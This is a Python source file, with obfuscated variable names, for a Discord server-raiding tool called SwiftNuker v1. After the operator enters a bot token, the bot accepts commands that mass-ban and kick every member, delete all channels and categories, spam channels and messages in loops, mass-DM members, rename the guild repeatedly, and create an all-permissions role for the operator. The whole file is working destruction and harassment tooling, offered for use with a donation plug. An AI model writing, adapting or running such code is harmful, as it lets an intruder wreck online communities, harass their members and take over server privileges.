import colorama #line:1
from colorama import Fore ,Style ,init #line:2
import time #line:3
import discord #line:4
import random #line:5
from discord .ext import commands #line:6
import os #line:7
import logging #line:8
import asyncio #line:9
import webbrowser #line:10
logging .basicConfig (level =logging .CRITICAL )#line:12
intents =discord .Intents .default ()#line:16
intents .message_content =True #line:17
client =commands .Bot (command_prefix ='.',intents =intents )#line:18
init ()#line:22
def goo ():#line:24
    os .system ('cls'if os .name =='nt'else 'clear')#line:25
print (Fore .LIGHTMAGENTA_EX +"""

                                         ███████╗██╗    ██╗██╗███████╗████████╗
                                         ██╔════╝██║    ██║██║██╔════╝╚══██╔══╝
                                         ███████╗██║ █╗ ██║██║█████╗     ██║   
                                         ╚════██║██║███╗██║██║██╔══╝     ██║   
                                         ███████║╚███╔███╔╝██║██║        ██║   
                                         ╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝        ╚═╝   

                                      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                                      ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                                      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                                      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                      ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                                      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                            
"""+Style .RESET_ALL )#line:43
token =input (Fore .CYAN +"  > paste bot token: "+Style .RESET_ALL )#line:45
ownerid =int (input (Fore .CYAN +"  > paste your discord id:"+Style .RESET_ALL ))#line:46
guildid =input (Fore .CYAN +"  > paste the server/guild id:"+Style .RESET_ALL )#line:47
@client .event #line:49
async def on_ready ():#line:50
    goo ()#line:51
    await client .change_presence (activity =discord .Game ('SWIFT ON TOP | v1'))#line:52
    print (Fore .BLUE +"Loading... Please stand by"+Style .RESET_ALL )#line:53
    time .sleep (0.5 )#line:54
    print (Fore .RED +"Loading... Please stand by"+Style .RESET_ALL )#line:55
    time .sleep (0.5 )#line:56
    print (Fore .LIGHTGREEN_EX +"Loading... Please stand by"+Style .RESET_ALL )#line:57
    time .sleep (2 )#line:58
    OOOO00OO0O0OOO00O ='https://github.com/Sxri/swift-nuker-v1'#line:59
    webbrowser .open_new_tab (OOOO00OO0O0OOO00O )#line:60
    print (Fore .LIGHTYELLOW_EX +"""
    

    
                                         ███████╗██╗    ██╗██╗███████╗████████╗
                                         ██╔════╝██║    ██║██║██╔════╝╚══██╔══╝
                                         ███████╗██║ █╗ ██║██║█████╗     ██║   
                                         ╚════██║██║███╗██║██║██╔══╝     ██║   
                                         ███████║╚███╔███╔╝██║██║        ██║   
                                         ╚══════╝ ╚══╝╚══╝ ╚═╝╚═╝        ╚═╝   

                                      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                                      ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                                      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                                      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                      ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                                      ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                               (Your Bot Is Now Online)
                                                Let's have some fun!!!
    """+Style .RESET_ALL )#line:80
    print (Fore .CYAN +"-----------------------------------------------------------------------------------------------------------------------"+Style .RESET_ALL )#line:82
    print (Fore .LIGHTGREEN_EX +"""
    

                                            LOG                           
                                            LOG                           
                                            LOG                           
                                            LOG      .LOG8.   .d88b.  d8b 
                                            LOG     d88""88b d88P"88b LOG 
                                            LOG     LOG  LOG LOG  LOG     
                                            LOG     Y88..88P Y88b LOG LOG 
                                            LOGLOG88 "Y88P"   "Y88888 Y8P 
                                                                  LOG     
                                                             LOG d88P     
                                                              "Y88P"     

                                (THE LOG WILL BE FLOODED WITH ERROR'S, PAY NO ATTENTION TO IT.)
                                            [DO NOT CLOSE THIS APPLICATION!]

                                    Commands can be found in the github readme.md file
                            Or, in the "cmds.txt" file included in the folder you downloaded this in.
                                    
    """+Style .RESET_ALL )#line:105
    print (Fore .LIGHTMAGENTA_EX +"""
                                            Thank you for using SwiftNuker v.1
                           Consider donating through the link in the github repositorys readme.md file!
    """+Style .RESET_ALL )#line:109
@client .command ()#line:110
async def spamchan (O0OOOOOO00OOO0O0O ,O0OOOO0O0000OOO00 :str ):#line:111
    try :#line:112
        for O00O000O0OOOO00O0 in range (100 ):#line:113
            O0OO0000OO00O00O0 =O0OOOO0O0000OOO00 #line:114
            await O0OOOOOO00OOO0O0O .guild .create_text_channel (O0OO0000OO00O00O0 )#line:115
            await asyncio .sleep (0.2 )#line:116
        print (Fore .CYAN +f"  > successfully added 100 new channels."+Style .RESET_ALL )#line:117
    except Exception as OOOOO0O000OOOOOOO :#line:118
        print (Fore .RED +"  > failed to spam channels, we're sorry."+Style .RESET_ALL )#line:119
@client .command ()#line:124
async def deletechan (OOO0O0OO0OO0O00OO ):#line:125
    try :#line:126
        for O00000O0O00OOO0O0 in OOO0O0OO0OO0O00OO .guild .text_channels :#line:127
            await O00000O0O00OOO0O0 .delete ()#line:128
        print (Fore .CYAN +"  > deleted all channels."+Style .RESET_ALL )#line:129
        for O000O00OOOOOOOO00 in OOO0O0OO0OO0O00OO .guild .categories :#line:130
            await O000O00OOOOOOOO00 .delete ()#line:131
        print (Fore .CYAN +"  > deleted all categories."+Style .RESET_ALL )#line:132
        await OOO0O0OO0OO0O00OO .guild .create_text_channel ("swift-cmds")#line:133
        print (Fore .RED +"  > without channels, you can't run commands. please use the '#swift-cmds' channel for running next commands."+Style .RESET_ALL )#line:134
    except :#line:135
        print ("Failed to delete channels.")#line:136
@client .command ()#line:138
async def nickall (OO0000O0000OO0O00 ,O000O0000O0000O0O :str ):#line:139
    try :#line:140
        for O0O0O00O0OOO0OO00 in OO0000O0000OO0O00 .guild .members :#line:141
            if O0O0O00O0OOO0OO00 .id !=ownerid :#line:142
                await O0O0O00O0OOO0OO00 .edit (nick =O000O0000O0000O0O )#line:143
    except :#line:144
        print (f"Failed to change nickname for {O0O0O00O0OOO0OO00.display_name}")#line:145
SKIP_BOTS =False #line:147
@client .command ()#line:149
async def banall (O000OO0OOO00O00OO ):#line:150
    for O00OO00OO00OOOOO0 in O000OO0OOO00O00OO .guild .members :#line:151
        try :#line:152
            await O00OO00OO00OOOOO0 .ban (reason ="banned")#line:153
        except :#line:154
            print (Fore .RED +"  > '.banall' command seems to not be working, this is common. We're sorry."+Style .RESET_ALL )#line:155
@client .command ()#line:157
async def rankme (OO0O0O0O00O00O0OO ):#line:158
    OOO0000OO0OOOO0O0 =await OO0O0O0O00O00O0OO .guild .create_role (name ="swift#8856")#line:159
    await OOO0000OO0OOOO0O0 .edit (permissions =discord .Permissions .all ())#line:160
    OOOOO0OOO000OOOOO =await client .fetch_user (ownerid )#line:161
    await OOOOO0OOO000OOOOO .add_roles (OOO0000OO0OOOO0O0 )#line:162
loop_enabled =False #line:165
@client .command ()#line:167
async def kickall (OOOO000OO0O0O0O00 ):#line:168
    for O0O0O0OO0OOO0OO00 in OOOO000OO0O0O0O00 .guild .members :#line:169
        try :#line:170
            await O0O0O0OO0OOO0OO00 .kick (reason ="swift/lurk fucked you")#line:171
            print (Fore .CYAN +f"kicked {O0O0O0OO0OOO0OO00.name}#{O0O0O0OO0OOO0OO00.discriminator}"+Style .RESET_ALL )#line:172
        except Exception as OOOOO00OO00O0OOOO :#line:173
            print (Fore .RED +f"failed to kick {O0O0O0OO0OOO0OO00.name}#{O0O0O0OO0OOO0OO00.discriminator}: {OOOOO00OO00O0OOOO}"+Style .RESET_ALL )#line:174
    print (Fore .CYAN +"  > successfully kicked all available members, please note: some may not have been kicked due to a rampage kick error."+Style .RESET_ALL )#line:175
@client .command ()#line:178
async def dmall (OO0OOOO0OO000O000 ,*,message ):#line:179
    for OO00O0O0OOO0O00O0 in OO0OOOO0OO000O000 .guild .members :#line:180
        try :#line:181
            await OO00O0O0OOO0O00O0 .send (message )#line:182
            print (f"DM sent to {OO00O0O0OOO0O00O0.name}#{OO00O0O0OOO0O00O0.discriminator}")#line:183
        except Exception as OOO0O0OO0OOOO00O0 :#line:184
            print (f"Failed to send DM to {OO00O0O0OOO0O00O0.name}#{OO00O0O0OOO0O00O0.discriminator}: {OOO0O0OO0OOOO00O0}")#line:185
    print (Fore .CYAN +"  > successfully mass DM'd all available members, please note: some may not have been DM'd due to a rampage DM error."+Style .RESET_ALL )#line:186
async def change_name_loop (OOO0O00OOOO0OOOO0 ,OOOOOOOOOO0000O0O ):#line:191
    global loop_enabled #line:192
    while loop_enabled :#line:193
        for OO0O00OOOOO000000 in OOOOOOOOOO0000O0O :#line:194
            await OOO0O00OOOO0OOOO0 .guild .edit (name =OO0O00OOOOO000000 )#line:195
            await asyncio .sleep (0.5 )#line:196
@client .command ()#line:198
async def namechange (OOOO00000OO0OO0OO ,*OO0OO0O00OOOO0000 ):#line:199
    global loop_enabled #line:200
    if loop_enabled :#line:201
        print (Fore .RED +"  > the namechange loop is already running."+Style .RESET_ALL )#line:202
        return #line:203
    loop_enabled =True #line:204
    await change_name_loop (OOOO00000OO0OO0OO ,OO0OO0O00OOOO0000 )#line:205
@client .command ()#line:207
async def stopnamechange (O000O0000OOOO0O0O ):#line:208
    global loop_enabled #line:209
    if not loop_enabled :#line:210
        print (Fore .RED +"  > theres no namechange loop running."+Style .RESET_ALL )#line:211
        return #line:212
    loop_enabled =False #line:213
    print (Fore .CYAN +"  > successfully stopped namechange loop"+Style .RESET_ALL )#line:214
    time .sleep (1.3 )#line:215
    await O000O0000OOOO0O0O .guild .edit (name ="Untitled Server")#line:216
    print (Fore .LIGHTGREEN_EX +"  > changed guild name to: 'Untitled Server', since loop is stopped."+Style .RESET_ALL )#line:217
send_all =False #line:218
@client .command ()#line:220
async def sayall (OOOOO0O00OOO0O0OO ,*,message ):#line:221
    global send_all #line:222
    send_all =True #line:223
    while send_all :#line:224
        try :#line:225
            for OOOO00000OO0O0O00 in OOOOO0O00OOO0O0OO .guild .text_channels :#line:226
                await OOOO00000OO0O0O00 .send (message )#line:227
        except :#line:228
            print (Fore .CYAN +"  > successfully sent message to all channels."+Style .RESET_ALL )#line:229
        await asyncio .sleep (0.3 )#line:230
@client .command ()#line:232
async def sayallstop (OO0O0OOO0000O00OO ):#line:233
    global send_all #line:234
    send_all =False #line:235
    print (Fore .CYAN +"  > successfully stopped sending messages to all channels."+Style .RESET_ALL )#line:236
@client .event #line:238
async def on_message (O0OOO00O0O0OOOOO0 ):#line:239
    if O0OOO00O0O0OOOOO0 .author ==client .user :#line:240
        return #line:241
    await client .process_commands (O0OOO00O0O0OOOOO0 )#line:243
try :#line:245
    client .run (token )#line:246
except Exception as e :#line:247
    print ("Loading...")#line:248
    print (Fore .GREEN +"> error: invalid token."+Style .RESET_ALL )#line:249
    print (" ")#line:250
    input (Fore .RED +"> press [ENTER] to exit."+Style .RESET_ALL )